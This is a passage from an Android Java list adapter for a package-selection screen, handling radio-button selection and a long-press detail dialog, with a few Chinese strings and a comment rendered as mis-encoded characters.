			listItemView.radio = (RadioButton) convertView.findViewById(R.id.SMradio);
			listItemView.text.setText((String) listItems.get(position).get("text"));
			listItemView.spec = (String) listItems.get(position).get("spec");
			listItemView.busi = (String) listItems.get(position).get("busi");
			listItemView.radio.setChecked((Boolean) listItems.get(position).get("flag"));
			final int p = position;
			if (isBind) {
				listItemView.radio.setClickable(false);
				if (position == clickPosition) {
					listItemView.radio.setChecked(true);
				} else {
					listItemView.radio.setChecked(false);
				}
			} else {

				listItemView.radio.setOnCheckedChangeListener(new OnCheckedChangeListener() {

					@Override
					public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {

						if (isChecked) {
							clickPosition = p;
							packagespe = listItemView.spec;
							packagebus = listItemView.busi;
						}
						notifyDataSetChanged();
						a = 1;

					}

				});
				if (a == 1) {
					if (clickPosition == position) {
						listItemView.radio.setChecked(true);
					} else {
						listItemView.radio.setChecked(false);
					}
				}
			}
			convertView.setOnLongClickListener(new OnLongClickListener() {

				@Override
				public boolean onLongClick(View v) {
					Log.i("=====position===", p + "");
					AlertDialog.Builder builder = new Builder(GuidePackage_SelectActivity.this);

					builder.setMessage((bean.getRows().get(p).getDetail()));

					builder.setTitle("�ײͽ���");

					builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {

						@Override
						public void onClick(DialogInterface dialog, int which) {
							dialog.dismiss();
						}
					});

					builder.create().show();
					return true;
				}
			});

			// ���ÿؼ�����converView
			convertView.setTag(listItemView);
			return convertView;

		}
	}
}
